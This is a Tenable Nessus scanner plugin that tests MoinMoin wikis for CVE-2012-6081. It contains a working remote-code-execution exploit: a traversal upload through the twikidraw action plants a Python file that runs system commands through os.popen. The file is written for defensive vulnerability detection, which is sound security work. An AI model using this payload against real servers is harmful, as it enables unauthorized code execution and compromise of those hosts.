#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63638);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/11/28 21:52:56 $");

  script_cve_id("CVE-2012-6081", "CVE-2012-6495");
  script_bugtraq_id(57082, 57147);
  script_osvdb_id(88825, 88827);
  script_xref(name:"EDB-ID", value:"25304");

  script_name(english:"MoinMoin twikidraw.py Traversal File Upload Arbitrary File Overwrite");
  script_summary(english:"Attempts to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A wiki application on the remote web server is affected by a code
execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The MoinMoin install hosted on the remote web server fails to properly
sanitize user-supplied input in the twikidraw (action/twikidraw.py)
action.  A remote, unauthenticated attacker could utilize a specially
crafted request using directory traversal style characters to upload a
file containing arbitrary code to the remote host.  An attacker could
then execute the code with the privileges of the user that runs the
MoinMoin process.  Successful exploitation requires that the MoinMoin
plugin directory has write permission set for the MoinMoin server user. 

Note that the 'anywikidraw' action is reportedly also affected by the
directory traversal and code execution vulnerabilities.  The application
is also reportedly affected by an additional directory traversal
vulnerability in the action/AttachFile.py script (CVE-2012-6080) as well
as a cross-site scripting (XSS) vulnerability when creating an rss link
(CVE-2012-6082).  Nessus has not, however, tested for these additional
issues."
  );
  script_set_attribute(attribute:"see_also", value:"http://moinmo.in/SecurityFixes");
  script_set_attribute(attribute:"see_also", value:"http://moinmo.in/SecurityFixes/CVE-2012-6081");
  # http://www.h-online.com/security/news/item/Hackers-gain-access-to-all-edu-domains-1858471.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1f8ddc57");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.9.6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"MoinMoin 1.9.5 RCE");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'MoinMoin twikidraw Action Traversal File Upload');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/12/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/12/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moinmo:moinmoin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("moinmoin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/moinmoin");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

install = get_install_from_kb(
  appname:"moinmoin",
  port:port,
  exit_on_fail:TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir, port:port);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';
  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";


# Check permissions on WikiSandBox page
res = http_send_recv3(
  method       : "GET",
  item         : dir + "/WikiSandBox",
  port         : port,
  exit_on_fail : TRUE
);

if ("Edit (Text)" >!< res[2] || "Edit (GUI)" >!< res[2])
  exit(0, "Authentication is required to test the" + "MoinMoin install at " + install_url + ".");

# Grab a ticket hash needed for the exploit
url = "/WikiSandBox?action=twikidraw&do=modify&target=../../../../data/plugin/action/nessus.py";

res = http_send_recv3(
  method       : "GET",
  item         : dir + url,
  port         : port,
  exit_on_fail : TRUE
);

# Versions 1.9.x < 1.9.2 do not use a ticket hash
# Versions 1.9.2 and up do require this value
pat = "&amp;ticket=(.+)&amp;";
match = eregmatch(pattern:pat, string:res[2]);
if (!isnull(match)) ticket = match[1];
else ticket = "";

# Check for escaping in versions >= 1.9.6 which indicate a non-affected instance
pat2 = 'param name="basename" value="(.._)+';
match2 = eregmatch(pattern:pat2, string:res[2]);
if (!isnull(match2))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "MoinMoin", install_url);

# variables for our loop
vuln = FALSE;
vuln2 = FALSE;

foreach cmd (cmds)
{
  script = (SCRIPT_NAME - ".nasl");
  script =  str_replace(string:script, find:"_", replace:"");
  exp_script = script + unixtime() + ".py";

  # Define our exploits
  # Unix exploit
  unix_exploit = '--89692781418184\nContent-Disposition: form-data;' +
    ' name="filename"\n\ndrawing.r if()else[]\nimport os\ndef execute(p,r):' +
    'exec"print>>r,os\\56popen(' + "'" + cmd + "&&pwd'" + ")\56read()" +
    '"\n--89692781418184\nContent-Disposition: form-data; name="filepath"; ' +
    'filename="drawing.png"\nContent-Type: image/png\n\nMoinMoin error' +
    '\n\n--89692781418184--';

  # Windows exploit
  win_exploit = '--89692781418184\nContent-Disposition: form-data; ' +
    'name="filename"\n\n"\n--89692781418184\nContent-Disposition: form-data;' +
    ' name="filepath"; filename="drawing.png"\nContent-Type: image/png\n\n' +
    'MoinMoin error\ndrawing.r if()else[]\nimport os\ndef execute(p,r):exec"' +
    'print>>r,os\\56popen(' + "'" + cmd + "&& dir'" + ")\56read()" +
    '"\n\n--89692781418184--';

  if (cmd == 'id') exploit = unix_exploit;
  else exploit = win_exploit;

  # Upload our file
  url = "?action=twikidraw&do=save&ticket=" + ticket +
    "&target=../../../../data/plugin/action/" + exp_script;

  res = http_send_recv3(
    method       : "POST",
    item         : dir + "/WikiSandBox" + url,
    add_headers  : make_array("Content-Type",
                   "multipart/form-data; boundary=89692781418184"),
    data         : exploit,
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();
  upload = res[2];

  # Test code execution with our uploaded file
  check_url = "/WikiSandBox?action=" + (exp_script - ".py");
  res = http_send_recv3(
    method       : "GET",
    item         : dir + check_url,
    port         : port,
    exit_on_fail : TRUE
  );

  # Extract path for reporting. /data/plugin/action is where upload will reside
  if (cmd == 'id')
  {
    get_path = strstr(res[2], "/");
    get_up_path = chomp(get_path) + "/data/plugin/action/" + script + "*";

    output = strstr(res[2], "uid") - get_path;
  }
  else
  {
    get_path = strstr(res[2], "Volume in drive");
    get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
    get_up_path = chomp((get_dir - " Directory of ")) + "\data\plugin\action\"+
       script + "*";

    output = strstr(res[2], "Windows IP") - get_path;
  }

  match = egrep(pattern:cmd_pats[cmd], string:res[2]);


  # For CGI installs, plugins are activated on the next request
  if (match)
  {
    vuln = TRUE;
    break;
  }
  # For the standalone or twisted servers, plugins are activated after
  # restarting the MoinMoin server.
  # For FastCGI and mod_python, Apache needs a restart for exploit to work.
  else if (
   (isnull(upload)) &&
   (!vuln) &&
   ("<h1>Unhandled Exception</h1>" >!< res[2])
  )
  {
    vuln2 = TRUE;
    break;
  }
}

# Exit if upload and/or attack fail
if ((!vuln) && (!vuln2))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "MoinMoin", install_url);

# Reporting
if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  # Reporting for successful exploit
  if (vuln)
  {
    report =
      '\nNessus was able to verify the issue exists using the following request :' +
       '\n' +
       '\n' + install_url + check_url +
       '\n' +
       '\nNote: This file has not been removed by Nessus and will need to be' +
       '\nmanually deleted (' + get_up_path + ').' +
       '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\nThis file was uploaded using the following request :' +
        '\n' +
        '\n' + snip +
        '\n' + exp_request +
        '\n' + snip +
        '\n' +
        '\n' + 'The file uploaded by Nessus executed the command "'+cmd+ '"' +
        '\nwhich produced the following output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(output) +
        '\n' + snip +
        '\n';
    }
  }
  # Reporting for successful upload, but attack would require a server restart
  # in order for plugin to be activated
  else if (vuln2)
  {
    report =
      '\nNessus was able to upload a file to the remote host, however cannot' +
      '\nverify the issue exists until the web server has been restarted.' +
      '\nTo test the issue after restarting your webserver, you can use the' +
      '\nfollowing URL to verify the exploit :' +
      '\n' +
      '\n' + install_url + check_url +
      '\n' +
      '\nNote that this file has not been removed by Nessus and will need to' +
      '\nbe manually deleted (/data/plugin/action/' + script + '*).' +
      '\n';
    if (report_verbosity > 1)
    {
      report +=
        '\nThis file was uploaded using the following request :' +
        '\n' +
        '\n' + snip +
        '\n' + exp_request +
        '\n' + snip +
        '\n';
    }
  }
  security_warning(port:port, extra:report);
}
else security_warning(port);
